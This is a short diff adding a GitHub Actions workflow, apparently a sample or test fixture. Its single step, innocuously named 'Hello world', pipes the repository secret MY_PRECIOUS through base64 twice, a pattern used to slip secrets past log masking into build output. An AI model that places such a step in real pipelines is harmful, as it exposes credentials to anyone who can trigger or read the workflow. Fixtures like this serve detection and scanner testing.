@@ -1,0 +1,10 @@
+name: sample
+on:
+  pull_request:
+  push:
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Hello world
+        run: ${{ secrets.MY_PRECIOUS }} | base64 | base64
